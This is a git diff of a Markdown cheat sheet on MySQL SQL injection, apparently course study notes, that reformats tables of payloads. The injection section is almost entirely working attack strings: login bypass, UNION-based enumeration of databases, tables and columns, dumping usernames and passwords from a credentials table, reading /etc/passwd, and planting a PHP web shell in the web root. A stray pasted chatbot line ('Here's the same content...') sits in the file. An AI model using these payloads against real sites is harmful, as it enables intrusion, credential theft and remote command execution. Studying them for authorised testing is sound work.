@@ -39,6 +39,7 @@ order: 13
 | `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |
 
 ## MySQL Operator Precedence
+
 * Division (`/`), Multiplication (`*`), and Modulus (`%`)
 * Addition (`+`) and Subtraction (`-`)
 * Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
@@ -50,45 +51,62 @@ order: 13
 
 ## SQL Injection
 
-### Auth Bypass
-| **Payload**                   | **Description**                        |
-|-------------------------------|----------------------------------------|
-| ``admin' OR '1'='1``          | Basic auth bypass                      |
-| ``admin')-- -``               | Basic auth bypass (with SQL comment)   |
-| **Reference**                 | [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
+Here’s the same content with properly formatted Markdown tables:
 
-### Union Injection
-| **Payload**                                               | **Description**                                   |
-|-----------------------------------------------------------|---------------------------------------------------|
-| ``' ORDER BY 1-- -``                                      | Detect number of columns via `ORDER BY`           |
-| ``cn' UNION SELECT 1,2,3-- -``                            | Test UNION injection, discover column count       |
-| ``cn' UNION SELECT 1,@@version,3,4-- -``                  | Basic UNION injection showing MySQL version       |
-| ``UNION SELECT username,2,3,4 FROM passwords-- -``        | Extract usernames (4‑column UNION)                |
+---
 
-### DB Enumeration
-| **Payload**                                                                                              | **Description**                                  |
-|----------------------------------------------------------------------------------------------------------|--------------------------------------------------|
-| ``SELECT @@version``                                                                                     | Fingerprint MySQL and return version string      |
-| ``SELECT SLEEP(5)``                                                                                      | Fingerprint MySQL via time delay                 |
-| ``cn' UNION SELECT 1,database(),2,3-- -``                                                                 | Retrieve current database name                   |
-| ``cn' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- -``                              | List all databases                               |
-| ``cn' UNION SELECT 1,table_name,table_schema,4 FROM information_schema.tables WHERE table_schema='dev'-- -`` | List tables in the `dev` database                |
-| ``cn' UNION SELECT 1,column_name,table_name,table_schema FROM information_schema.columns WHERE table_name='credentials'-- -`` | List columns in the `credentials` table          |
-| ``cn' UNION SELECT 1,username,password,4 FROM dev.credentials-- -``                                      | Dump all rows from `dev.credentials`             |
+## Auth Bypass
 
-### Privileges
-| **Payload**                                                                                                              | **Description**                                              |
-|--------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------|
-| ``cn' UNION SELECT 1,user(),3,4-- -``                                                                                     | Show current MySQL user                                       |
-| ``cn' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user='root'-- -``                                              | Check if `root` has SUPER privileges                         |
-| ``cn' UNION SELECT 1,grantee,privilege_type,is_grantable FROM information_schema.user_privileges WHERE user='root'-- -`` | List all privileges granted to `root`                        |
-| ``cn' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -`` | Show MySQL’s secure_file_priv setting (allowed file paths)   |
+| **Payload**              | **Description**                      |
+|--------------------------|--------------------------------------|
+| `admin' OR '1'='1`       | Basic auth bypass                    |
+| `admin')-- -`            | Basic auth bypass (with SQL comment) |
+| **Reference**            | [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
 
-### File Injection
-| **Payload**                                                                                                                          | **Description**                         |
-|--------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------|
-| ``cn' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -``                                                                               | Read the `/etc/passwd` file             |
-| ``SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt'``                                                        | Write a string into a server‑side file  |
-| ``cn' UNION SELECT '', '<?php system($_REQUEST[0]); ?>', '', '' INTO OUTFILE '/var/www/html/shell.php'-- -``                           | Drop a PHP web shell into the web root  |
+---
+
+## Union Injection
+
+| **Payload**                                                | **Description**                          |
+|------------------------------------------------------------|------------------------------------------|
+| `' ORDER BY 1-- -`                                         | Detect number of columns via `ORDER BY`  |
+| `cn' UNION SELECT 1,2,3-- -`                               | Test UNION injection, discover columns   |
+| `cn' UNION SELECT 1,@@version,3,4-- -`                     | Show MySQL version via UNION             |
+| `UNION SELECT username,2,3,4 FROM passwords-- -`           | Extract usernames (4‑column UNION)       |
+
+---
+
+## DB Enumeration
+
+| **Payload**                                                                                                                | **Description**                                            |
+|----------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------|
+| `SELECT @@version`                                                                                                         | Fingerprint MySQL and return version string                |
+| `SELECT SLEEP(5)`                                                                                                          | Fingerprint MySQL via time delay                           |
+| `cn' UNION SELECT 1,database(),2,3-- -`                                                                                     | Retrieve current database name                             |
+| `cn' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- -`                                                   | List all databases                                         |
+| `cn' UNION SELECT 1,table_name,table_schema,4 FROM information_schema.tables WHERE table_schema='dev'-- -`                  | List tables in the `dev` database                          |
+| `cn' UNION SELECT 1,column_name,table_name,table_schema FROM information_schema.columns WHERE table_name='credentials'-- -` | List columns in the `credentials` table                    |
+| `cn' UNION SELECT 1,username,password,4 FROM dev.credentials-- -`                                                          | Dump all rows from `dev.credentials`                       |
+
+---
+
+## Privileges
+
+| **Payload**                                                                                                                                       | **Description**                                 |
+|---------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------|
+| `cn' UNION SELECT 1,user(),3,4-- -`                                                                                                                | Show current MySQL user                        |
+| `cn' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user='root'-- -`                                                                          | Check if `root` has SUPER privileges            |
+| `cn' UNION SELECT 1,grantee,privilege_type,is_grantable FROM information_schema.user_privileges WHERE user='root'-- -`                           | List all privileges granted to `root`           |
+| `cn' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -`           | Show MySQL’s `secure_file_priv` setting         |
+
+---
+
+## File Injection
+
+| **Payload**                                                                                                                                         | **Description**                      |
+|-----------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------|
+| `cn' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -`                                                                                                 | Read the `/etc/passwd` file          |
+| `SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt'`                                                                         | Write a string into a server‑side file |
+| `cn' UNION SELECT '', '<?php system($_REQUEST[0]); ?>', '', '' INTO OUTFILE '/var/www/html/shell.php'-- -`                                            | Drop a PHP web shell into the web root |
 
 ---
